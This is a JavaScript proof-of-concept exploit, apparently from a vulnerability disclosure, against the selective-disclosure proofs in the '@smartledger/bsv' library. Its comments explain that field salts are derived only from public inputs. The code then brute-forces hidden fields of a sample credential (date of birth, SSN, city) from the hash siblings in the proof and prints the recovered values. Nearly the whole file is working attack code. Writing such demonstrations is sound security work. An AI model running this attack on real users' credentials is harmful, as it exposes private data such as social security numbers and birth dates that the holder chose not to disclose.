// Can an UNDISCLOSED field's value be recovered from a selective-disclosure proof alone?
//
// A selective disclosure is supposed to hide the fields it does not disclose.  The salt is what
// makes a field's commitment unguessable.  Here the salt is
//
//     sha256(nonce + path + index)
//
// which has NO secret input: the nonce ships inside the proof, the path comes from the schema,
// and the index is a small integer.  So every salt in the credential - including the salts of
// fields that were never disclosed - is derivable by anyone holding the proof.  The merkle proof
// of a disclosed field carries its sibling hashes, and a sibling at depth 0 IS an undisclosed
// field's leaf commitment.  Guess a candidate value, derive the salt, hash, compare.
//
// Nothing secret is used below: only proof.nonce, the field paths, and the published library's
// own hashing, which any consumer can read.
//
//   usage: node ltp-salt-brute.js <installdir> [pkgName]
var name = process.argv[3] || '@smartledger/bsv'
var pkgdir = process.argv[2] + '/node_modules/' + name
var version = require(pkgdir + '/package.json').version
var LTP = require(pkgdir + '/lib/ltp/proof')
var Hash = require(pkgdir + '/lib/crypto/hash')

var SECRET_DOB = '1987-03-14'
var SECRET_CITY = 'Austin'
var cred = { claim: { name: 'Alice', dob: SECRET_DOB, ssn: '123-45-6789', city: SECRET_CITY } }
var PATHS = ['claim.name', 'claim.dob', 'claim.ssn', 'claim.city']

var r = LTP.prepareSelectiveDisclosure(cred, ['claim.name'], 'abc123')
var proof = r.proof || r
console.log(name + '@' + version)
console.log('  disclosed: claim.name only.  undisclosed: dob, ssn, city')
console.log('  the holder hands over the proof; the attacker has nothing else.\n')

// Everything from here on uses ONLY the proof and the schema.
var nonce = proof.nonce
var leaf = function (path, value, index) {
  var salt = Hash.sha256(Buffer.from(nonce + path + index)).toString('hex')
  return LTP._hashField(path, value, salt)
}
var sib = proof.merkleProofs[0].proof[0].hash
console.log('  nonce recovered from the proof:      ' + nonce)
console.log('  depth-0 sibling hash in the proof:   ' + sib)
console.log('  that sibling is the leaf of whichever field sits next to the disclosed one.\n')

// A date of birth over a century of days: 36,525 candidates.
var found = null
var tried = 0
for (var y = 1920; y <= 2019 && !found; y++) {
  for (var m = 1; m <= 12 && !found; m++) {
    for (var d = 1; d <= 31 && !found; d++) {
      var cand = y + '-' + ('0' + m).slice(-2) + '-' + ('0' + d).slice(-2)
      for (var idx = 0; idx < PATHS.length; idx++) {
        tried++
        if (leaf('claim.dob', cand, idx) === sib) { found = { value: cand, index: idx }; break }
      }
    }
  }
}
console.log('  brute force of claim.dob over 1920-2019 (' + tried + ' hashes tried):')
if (found) {
  console.log('    RECOVERED claim.dob = ' + found.value + '  at index ' + found.index)
  console.log('    the real value was  = ' + SECRET_DOB + '   -> ' + (found.value === SECRET_DOB ? 'MATCH' : 'WRONG'))
} else {
  console.log('    not recovered - the sibling is not a directly guessable leaf here')
}

// The depth-1 sibling is the PARENT of two undisclosed leaves, so both must be guessed together.
// Shown with the city from a short list and the SSN over a narrow window containing the real
// value, which establishes the mechanism without spending 10^9 hashes to prove arithmetic.
var sib1 = proof.merkleProofs[0].proof[1] && proof.merkleProofs[0].proof[1].hash
if (sib1) {
  var CITIES = ['Austin', 'Boston', 'Denver', 'Fresno', 'Newark']
  var pair = null
  for (var ci = 0; ci < CITIES.length && !pair; ci++) {
    for (var n = 123450000; n <= 123460000 && !pair; n++) {
      var s = String(n).replace(/^(\d{3})(\d{2})(\d{4})$/, '$1-$2-$3')
      var h = Hash.sha256(Buffer.from(leaf('claim.ssn', s, 2) + leaf('claim.city', CITIES[ci], 3))).toString('hex')
      if (h === sib1) pair = { ssn: s, city: CITIES[ci] }
    }
  }
  console.log('\n  joint brute force of (claim.ssn, claim.city) against the depth-1 sibling:')
  console.log(pair
    ? '    RECOVERED claim.ssn = ' + pair.ssn + ', claim.city = ' + pair.city +
      '\n    search space used: 5 cities x 10,001 numbers. The full space is 5 x 10^9, which is hours, not years.'
    : '    not recovered with this pairing/ordering guess')
}
